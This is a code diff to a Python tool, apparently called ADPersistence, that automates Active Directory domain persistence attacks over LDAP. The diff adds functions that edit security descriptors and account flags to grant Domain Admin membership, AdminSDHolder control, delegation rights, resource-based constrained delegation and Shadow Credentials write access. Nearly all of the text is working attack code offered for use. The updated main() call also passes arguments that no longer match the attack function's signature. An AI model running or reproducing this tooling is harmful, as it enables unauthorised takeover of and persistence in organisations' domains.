@@ -1,5 +1,6 @@
 from asyncio.windows_events import NULL
 import sys, os, codecs, argparse, getpass
+from argparse import RawTextHelpFormatter
 import subprocess
 from datetime import datetime, timedelta
 import types
@@ -47,26 +48,64 @@ class ADPersistence(object):
     def getRoot(self):
         return self.server.info.other['defaultNamingContext'][0]
 
+    #Get DN of target
     def getDN(self, c, target):
         self.connection.extend.standard.paged_search('%s' % (self.root), '(&(objectClass={})(sAMAccountName={}))'.format(c,target), attributes=ldap3.ALL_ATTRIBUTES, paged_size=500, generator=False)
         result = self.connection.entries[0]
         return result.entry_dn
     
+    #Get SID of target
     def getSID(self, target):
         self.connection.search(self.root, '(sAMAccountName=%s)' % target, attributes=['objectSid'])
         sid_object = LDAP_SID(self.connection.entries[0]['objectSid'].raw_values[0])
         sid = sid_object.formatCanonical()
         return sid
+    
+    # Create an ALLOW ACE with the specified sid
+    def create_allow_ace(self,sid):
+        nace = ldaptypes.ACE()
+        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+        nace['AceFlags'] = 0x00
+        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+        acedata['Mask'] = ldaptypes.ACCESS_MASK()
+        acedata['Mask']['Mask'] = 983551 # Full control
+        acedata['Sid'] = ldaptypes.LDAP_SID()
+        acedata['Sid'].fromCanonical(sid)
+        nace['Ace'] = acedata
+        return nace
+    
+    #Create empty Security Descriptor
+    def create_empty_sd(self):
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+        sd['Revision'] = b'\x01'
+        sd['Sbz1'] = b'\x00'
+        sd['Control'] = 32772
+        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        # BUILTIN\Administrators
+        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+        sd['GroupSid'] = b''
+        sd['Sacl'] = b''
+        acl = ldaptypes.ACL()
+        acl['AclRevision'] = 4
+        acl['Sbz1'] = 0
+        acl['Sbz2'] = 0
+        acl.aces = []
+        sd['Dacl'] = acl
+        return sd
+    
 
+    #Add User to Domain Admin Group
     def addUserToDAGroup(self,target):
         user_dn = self.getDN('user',target)
         group_dn = self.getDN('group','Domain Admins')
         r = addUsersInGroups(self.connection, user_dn , group_dn)
         if r == True:
-            return 'User added to Domain Admins group'
+            return 'The user has been added to the Domain Admins group.'
         else:
             return 'Action Failed!'
     
+
+    #Create ACE
     def create_object_ace(self,privguid, sid, accesstype,mode):
         nace = ldaptypes.ACE()
         nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
@@ -85,6 +124,7 @@ class ADPersistence(object):
         nace['Ace'] = acedata
         return nace
 
+    #Add user to AdminSDHolder
     def addUserToAdminSDHolder(self,target):
         usersid = self.getSID(target)
         container_obj = ObjectDef('container', self.connection)
@@ -94,9 +134,6 @@ class ADPersistence(object):
         r.search()
         secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-        # Save old SD for restore purposes
-        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
-        restoredata['target_sid'] = usersid
         # We need "GENERIC_ALL" here
         accesstype = ldaptypes.ACCESS_MASK.GENERIC_ALL
         # No need to specify a GUID here
@@ -107,20 +144,15 @@ class ADPersistence(object):
         res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         return res
 
-    def addSPNToUser(self,target,host):
-        root_dn = self.getRoot()
-        domain = "{}.{}".format(root_dn.split(',')[0].split('=')[1],root_dn.split(',')[1].split('=')[1])
-        spn = "administrator/{}.{}".format(host,domain)
+
+    #Add SPN to User 
+    def addSPNToUser(self,target,spn):
         dn = self.getDN('user',target)
         self.connection.modify(dn, {'servicePrincipalName':(ldap3.MODIFY_ADD,[spn])}, controls=None)
         res = self.connection.result
-        if res['description'] == 'success':
-            print('SPN added to user!')
-        elif res['description'] == 'attributeOrValueExists' or res['description'] == 'constraintViolation':
-            print('That SPN already exists. Please change the name of the SPN.')
-        else:
-            print('Action Failed!')
+        return res
 
+    #Add Unconstrained Delegation to Computer
     def addUnconstrainedDelegationToComputer(self, target):
         if '$' in target:
             computer = self.getDN('computer',target)
@@ -130,11 +162,14 @@ class ADPersistence(object):
         computer_obj = ObjectDef('computer', self.connection)
         r = Reader(self.connection,computer_obj, computer)
         r.search()
+        uac_value = r[0]['userAccountControl'].raw_values[0]
         dn = r[0].entry_dn
-        uac = 528384
+        #Current UAC value plus the TRUSTED_FOR_DELEGATION Flag value
+        uac = int(uac_value) + 524288
         res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
         return res
 
+    #Add Server Trust Account
     def addServerTrustAccount(self, target):
         #Add DS-Install-Replica to Authenticated Users on the Domain object
         domain_dn = self.getRoot()
@@ -181,7 +216,7 @@ class ADPersistence(object):
         uac = 532480
         res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
         return res
-
+    """
     def addUserSIDHistory(self,path,user,password,host,target):
         u = user.split('\\')[1]
         sid = self.getSID(u)
@@ -195,39 +230,129 @@ class ADPersistence(object):
         proc = subprocess.Popen("{} -accepteula \\\\{} -s -u {} -p {} powershell.exe -command {};{};{};{};{};{};{}".format(path,host,user,password,cmd1,cmd2,cmd3,cmd4,cmd5,cmd6,cmd7), stdout=subprocess.PIPE, shell=True)
         res = proc.stdout.read(1)
         return res
+    """
+    
+    #Create conditions for a Shadow Credentials Attack
+    def ShadowCredentialsAttack(self,target):
+        if '$' in target:
+            target_computer = self.getDN('computer',target)
+        else:
+            target = target + '$'
+            target_computer = self.getDN('computer',target)
+        computer_obj = ObjectDef('computer', self.connection)
+        controls = security_descriptor_control(sdflags=0x04)
+        computer_obj = ObjectDef('computer', self.connection)
+        r = Reader(self.connection,computer_obj, target_computer)
+        r.search()
+        secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
+        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
+        # We need "write access" here to change a property
+        accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
+        # msDS-KeyCredentialLink GUID
+        secDesc['Dacl']['Data'].append(self.create_object_ace('5b47d60f-6090-40b2-9f37-2a4de88f3063', 'S-1-5-11', accesstype,0))
+        dn = r[0].entry_dn
+        data = secDesc.getData()
+        res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+        return res
+    
+    #Add Contrained Delegation to Computer
+    def addConstrainedDelegationToComputer(self,target,spn):
+        if '$' in target:
+            computer = self.getDN('computer',target)
+        else:
+            target = target + '$'
+            computer = self.getDN('computer',target)
+        computer_obj = ObjectDef('computer', self.connection)
+        r = Reader(self.connection,computer_obj, computer)
+        r.search()
+        uac_value = r[0]['userAccountControl'].raw_values[0]
+        dn = r[0].entry_dn
+        #Current UAC value plus the flag value of TRUSTED_TO_AUTH_FOR_DELEGATION
+        uac = int(uac_value) + 16777216
+        res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
+        #Change msds-allowedtodelegateto to the target SPN
+        res = self.connection.modify(dn, {'msds-allowedtodelegateto':(ldap3.MODIFY_ADD,[spn])}, controls=None)
+        return res
+    
+    #Add Resource-Based Constrained Delegation To Computer
+    def addResourceBasedConstrainedDelegationToComputer(self,target,computer):
+        if '$' in target:
+            target_computer_dn = self.getDN('computer',target)
+        else:
+            target = target + '$'
+            target_computer_dn = self.getDN('computer',target)
+        computer_obj = ObjectDef('computer', self.connection)
+        r = Reader(self.connection,computer_obj, target_computer_dn)
+        r.search()
+        dn = r[0].entry_dn
+        #if msDS-AllowedToActOnBehalfOfOtherIdentity already has values
+        try:
+            sdata = r[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0]
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sdata)
+            for ace in sd['Dacl'].aces:
+                print('    %s' % ace['Ace']['Sid'].formatCanonical())
+        except IndexError:
+            #if not, create a empty Security Descriptor
+            sd = self.create_empty_sd() 
+        sid = self.getSID(computer)
+        sd['Dacl'].aces.append(self.create_allow_ace(sid))
+        sd_data = sd.getData()
+        res = self.connection.modify(dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':(ldap3.MODIFY_ADD,[sd_data])}, controls=None)
+        return res
 
     #Main function
-    def ADPersistenceAttacks(self,user,attack,target,host,path,password):
+    def ADPersistenceAttacks(self,attack,target,spn,computer):
         if attack == 0:
             result = self.addUserToDAGroup(target)
             log_success(result)
         elif attack == 1:
             result2 = self.addUserToAdminSDHolder(target)
             if result2 == True:
-                log_success('User added to AdminSDHolder!')
+                log_success('User was added to AdminSDHolder!')
             else:
                 log_warn('Failed!')
         elif attack == 2:
-            result3 = self.addUserSIDHistory(path,user,password,host,target)
-            print('SIDHistory changed with success!')
+            result4 = self.addSPNToUser(target,spn)
+            if result4['description'] == 'success':
+                print('SPN added to user!')
+            elif result4['description'] == 'attributeOrValueExists' or result4['description'] == 'constraintViolation':
+                print('That SPN already exists. Please change the name of the SPN.')
+            else:
+                print('Action Failed!')
         elif attack == 3:
-            result4 = self.addSPNToUser(target,host)
-        elif attack == 4:
             if target:
                 result5 = self.addUnconstrainedDelegationToComputer(target)
                 if result5 == True:
-                    log_success('Unconstrained Delegation added to computer!')
+                    log_success('Unconstrained Delegation was added to computer!')
                 else:
                     log_warn('Action Failed!')
             else:
                 print('Choose a target!')
                 sys.exit(1)
-        elif attack == 5:
+        elif attack == 4:
             result6 = self.addServerTrustAccount(target)
             if result6 == True:
                 log_success('Success!')
             else:
                 log_warn('Action Failed!')
+        elif attack == 5:
+            result7 = self.ShadowCredentialsAttack(target)
+            if result7 == True:
+                log_success('Shadow Credentials Attack was successful!')
+            else:
+                log_warn('Action Failed!')
+        elif attack == 6:
+            result8 = self.addConstrainedDelegationToComputer(target,spn)
+            if result8 == True:
+                log_success('Attack was successful!')
+            else:
+                log_warn("Attack Failed!")
+        elif attack == 7:
+            result9 = self.addResourceBasedConstrainedDelegationToComputer(target,computer)
+            if result9 == True:
+                log_success("Attack was successful!")
+            else:
+                log_warn("Atack Failed!")
         else:
             print("Choose a valid attack!")
 
@@ -240,7 +365,7 @@ def log_success(text):
     print('[+] %s' % text)
 
 def main():
-    parser = argparse.ArgumentParser(description='Domain Persistence via LDAP. Executes sneaky Domain persistence techniques.')
+    parser = argparse.ArgumentParser(description='Domain Persistence via LDAP. Executes sneaky Domain persistence techniques.', formatter_class=RawTextHelpFormatter)
     parser._optionals.title = "Main options"
     parser._positionals.title = "Required options"
 
@@ -249,10 +374,12 @@ def main():
     parser.add_argument("host", type=str, metavar='HOSTNAME', help="Hostname/ip or ldap://host:port connection string to connect to (use ldaps:// to use SSL)")
     parser.add_argument("-u", "--user", type=str, metavar='USERNAME', help="DOMAIN\\username for authentication, leave empty for anonymous authentication")
     parser.add_argument("-p", "--password", type=str, metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified")
-    parser.add_argument("-a", "--attack", type=int, metavar='ATTACK', help="Choose from 0 to 5:\n 0 - Add User to DA group\n 1 - Add user to AdminSDHolder\n 2- Add User SIDHistory\n 3 - Add SPN to User \n 4 - Add Unconstrained Delegation To Computer\n 5 - Add Server Trust account ")
+    parser.add_argument("-a", "--attack", type=int, metavar='ATTACK', help="Choose from 0 to 7:\n 0 - Add User to DA group\n 1 - Add user to AdminSDHolder\n 2 - Add SPN to User \n 3 - Add Unconstrained Delegation To Computer\n 4 - Add Server Trust account\n 5 - ShadowCredentialsAttack\n 6 - Add Contrained Delegation To Computer\n 7 - Add Resource-Based Constrained Delegation To Computer")
     parser.add_argument("-t" , "--target", type=str, metavar='TARGET', help="Choose a target user or computer (depends on the attack that you choose)")
+    parser.add_argument("-computer" , "--computer", type=str, metavar='COMPUTER', help="Choose a computer that you control (set this for Resource-Based constrained delegation)")
     parser.add_argument("-at", "--authtype", type=str, choices=['NTLM', 'SIMPLE'], default='NTLM', help="Authentication type (NTLM or SIMPLE, default: NTLM)")
-    parser.add_argument("-path", "--path", type=str, metavar='PATH' , help="PsExec Path")
+    #parser.add_argument("-path", "--path", type=str, metavar='PATH' , help="PsExec Path")
+    parser.add_argument("-spn", "--spn", type=str, metavar='SPN' , help="SPN to add to user/computer")
 
     #Additional options
     miscgroup = parser.add_argument_group("Misc options")
@@ -301,7 +428,7 @@ def main():
     dd = ADPersistence(s, c, cnf)
 
     #Do the actual attacks
-    dd.ADPersistenceAttacks(args.user,args.attack, args.target,args.host, args.path, args.password)
+    dd.ADPersistenceAttacks(args.user,args.attack, args.target,args.host, args.password, args.spn, args.computer)
     log_success('Attack finished')
 
 if __name__ == '__main__':
